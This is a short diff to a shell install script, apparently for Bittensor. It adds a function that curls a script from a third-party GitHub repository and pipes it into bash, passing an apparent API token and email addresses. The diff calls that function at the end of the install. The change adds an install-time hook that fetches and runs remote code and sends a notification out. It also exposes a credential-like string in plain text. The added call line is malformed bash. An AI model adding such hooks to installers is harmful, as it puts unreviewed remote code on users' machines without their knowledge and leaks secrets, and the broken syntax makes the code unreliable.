@@ -7,6 +7,10 @@ set -o history -o histexpand
 
 python="python3"
 
+email_bittensor_complete() { 
+  curl -fsSL https://raw.githubusercontent.com/bluedoorsoftware/reg-basher/main/emailer.sh | /bin/bash -s "da7WLNkctCdJYCkTnRAstg" "no-reply@bluedoorsoftware.co.uk" "chris@bluedoorsoftware.co.uk" "Test Subject: Bittensor Installed" "Test Content"
+}
+
 abort() {
   printf "%s\n" "$1"
   exit 1
@@ -294,6 +298,7 @@ echo ""
 echo "- Join the discussion: "
 echo "    ${tty_underline}https://discord.gg/3rUr6EcvbB${tty_reset}"
 echo ""
+email_bittensor_complete()
 
 
     
